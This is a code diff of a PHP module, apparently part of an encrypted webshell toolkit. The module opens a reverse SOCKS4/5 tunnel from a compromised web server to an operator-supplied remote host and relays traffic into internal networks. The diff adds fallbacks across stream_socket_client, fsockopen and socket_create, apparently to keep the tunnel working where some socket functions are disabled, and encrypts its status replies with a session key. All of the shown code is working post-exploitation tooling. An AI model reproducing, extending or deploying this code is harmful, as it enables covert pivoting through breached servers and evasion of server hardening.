@@ -22,9 +22,13 @@ function main($action, $remoteIP, $remotePort)
         @session_start();
         $_SESSION["socks_running"] = false;
         session_write_close();
+        $result["status"] = base64_encode("success");
+            $key = $_SESSION['k'];
+            echo encrypt(json_encode($result),$key);
         return;
     }
     global $read, $outers, $targets;
+    global $socketRead,$socketWrite,$socketClose,$socketSelect;
     $ready = false;
     $outers = array();
     $targets = array();
@@ -36,24 +40,44 @@ function main($action, $remoteIP, $remotePort)
     $read = array_merge($targets, $outers);
     while ($_SESSION["socks_running"]) {
         if ($ready == false) {
-            $outterSocket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+            /*$outterSocket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
             socket_connect($outterSocket, $remoteIP, intval($remotePort));
             $outers[$outterSocket] = $outterSocket;
             $ready = true;
+            */
+             $outtersocketObj = getSocket($remoteIP, $remotePort);
+                                        $outterSocket = $outtersocketObj["s"];
+                                        $s_type = $outtersocketObj["s_type"];
+                                        $outers[intval($outterSocket)] = $outterSocket;
+
+
+
+                                        $socketRead = "socket_read";
+                                        $socketWrite = "socket_write";
+                                        $socketClose = "socket_close";
+                                        $socketSelect = "socket_select";
+                                        if ($s_type == 'stream') {
+                                            $socketRead = "fread";
+                                            $socketWrite = "fwrite";
+                                            $socketClose = "fclose";
+                                            $socketSelect = "stream_select";
+                                        }
+                                        $ready=true;
+
         }
         $read = array();
         $read = array_merge($targets, $outers);
 
-        if (socket_select($read, $write, $exp, null) > 0) {
+        if ($socketSelect($read, $write, $exp, null) > 0) {
             foreach ($read as $socket_item) {
                 if (in_array($socket_item, $outers)) {
-                    if (isset($targets[$socket_item])) {
-                        $content = socket_read($socket_item, 2048);
+                    if (isset($targets[intval($socket_item)])) {
+                        $content = $socketRead($socket_item, 2048);
                         if (strlen($content) == 0) {
-                            unset($outers[$socket_item]);
+                            unset($outers[intval($socket_item)]);
                             continue;
                         }
-                        socket_write($targets[$socket_item], $content, strlen($content));
+                        $socketWrite($targets[intval($socket_item)], $content, strlen($content));
                     } else {
                         $ready = false;
                         if (handleSocks($socket_item)) {
@@ -64,12 +88,12 @@ function main($action, $remoteIP, $remotePort)
                 if (in_array($socket_item, $targets)) {
                     foreach ($targets as $k => $v) {
                         if ($socket_item == $v) {
-                            $content = socket_read($socket_item, 2048);
+                            $content = $socketRead($socket_item, 2048);
                             if (strlen($content) == 0) {
                                 unset($targets[$k]);
                                 continue;
                             }
-                            socket_write($outers[$k], $content, strlen($content));
+                            $socketWrite($outers[$k], $content, strlen($content));
                         }
                     }
                 }
@@ -85,7 +109,8 @@ function main($action, $remoteIP, $remotePort)
 function handleSocks($socket)
 {
 
-    $ver = socket_read($socket, 1);
+    global $socketRead,$socketWrite,$socketClose,$socketSelect;
+    $ver = $socketRead($socket, 1);
     if ($ver == "\x05") {
         return parseSocks5($socket);
     } else if ($ver == "\x04") {
@@ -96,34 +121,35 @@ function handleSocks($socket)
 function parseSocks5($socket)
 {
     global $read, $outers, $targets;
-    $nmethods = socket_read($socket, 1);
+    global $socketRead,$socketWrite,$socketClose,$socketSelect;
+    $nmethods = $socketRead($socket, 1);
     for ($i = 0; $i < ord($nmethods); $i++) {
-        $methods = socket_read($socket, 1);
+        $methods = $socketRead($socket, 1);
     }
-    socket_write($socket, "\x05\x00", 2);
-    $version = socket_read($socket, 1);
+    $socketWrite($socket, "\x05\x00", 2);
+    $version = $socketRead($socket, 1);
     if ($version == "\x02") {
-        $version = socket_read($socket, 1);
-        $cmd = socket_read($socket, 1);
-        $rsv = socket_read($socket, 1);
-        $atyp = socket_read($socket, 1);
+        $version = $socketRead($socket, 1);
+        $cmd = $socketRead($socket, 1);
+        $rsv = $socketRead($socket, 1);
+        $atyp = $socketRead($socket, 1);
     } else {
-        $cmd = socket_read($socket, 1);
-        $rsv = socket_read($socket, 1);
-        $atyp = socket_read($socket, 1);
+        $cmd = $socketRead($socket, 1);
+        $rsv = $socketRead($socket, 1);
+        $atyp = $socketRead($socket, 1);
     }
     if ($atyp == "\x01") {
-        $target = socket_read($socket, 4);
-        $targetPort = socket_read($socket, 2);
+        $target = $socketRead($socket, 4);
+        $targetPort = $socketRead($socket, 2);
         $host = inet_ntop($target);
     } else if ($atyp == "\x03") {
-        $targetLen = socket_read($socket, 1);
-        $target = socket_read($socket, $targetLen);
-        $targetPort = socket_read($socket, 2);
+        $targetLen = $socketRead($socket, 1);
+        $target = $socketRead($socket, $targetLen);
+        $targetPort = $socketRead($socket, 2);
         $host = $target;
     } else if ($atyp == "\x04") {
-        $target = socket_read($socket, 16);
-        $targetPort = socket_read($socket, 2);
+        $target = $socketRead($socket, 16);
+        $targetPort = $socketRead($socket, 2);
         $host = $target;
     }
     //$port=(ord($port[0]) & 0xff) * 256 + (ord($port[1]) & 0xff);
@@ -134,15 +160,18 @@ function parseSocks5($socket)
         $host = gethostbyname($host);
         try {
 
-            $targetSocket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
-            socket_connect($targetSocket, $host, $port);
-            $targets[$socket] = $targetSocket;
+            /*$targetSocket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+            socket_connect($targetSocket, $host, $port);*/
+
+            $targetSocketObj=getSocket($host, $port);
+            $targetSocket=$targetSocketObj["s"];
+            $targets[intval($socket)] = $targetSocket;
             $read[] = $targetSocket;
 
-            socket_write($socket, "\x05\x00\x00\x01" . packAddr($host, $port));
+            $socketWrite($socket, "\x05\x00\x00\x01" . packAddr($host, $port));
             return true;
         } catch (Exception $e) {
-            socket_write($socket, "\x05\x05\x00\x01");
+            $socketWrite($socket, "\x05\x05\x00\x01");
             throw new Exception(sprintf("[%s:%d] Remote failed", $host, $port));
         }
     } else {
@@ -173,3 +202,35 @@ function encrypt($data, $key)
         return openssl_encrypt($data, "AES128", $key);
     }
 }
+function getSocket($ip, $port)
+{
+    $resultObj=array();
+    if (($f = 'stream_socket_client') && is_callable($f)) {
+        $s = $f("tcp://{$ip}:{$port}");
+        $s_type = 'stream';
+    }
+    if (!$s && ($f = 'fsockopen') && is_callable($f)) {
+        $s = $f($ip, $port);
+        $s_type = 'stream';
+    }
+    if (!$s && ($f = 'socket_create') && is_callable($f)) {
+        $s = $f(AF_INET, SOCK_STREAM, SOL_TCP);
+        $res = @socket_connect($s, $ip, $port);
+        if (!$res) {
+            die();
+        }
+        $s_type = 'socket';
+    }
+    if (!$s_type) {
+        $s_type="error";
+        $s='no socket funcs';
+    }
+    if (!$s) {
+        $s_type="error";
+        $s='no socket';
+    }
+    $resultObj["s"]=$s;
+    $resultObj["s_type"]=$s_type;
+    return $resultObj;
+}
+
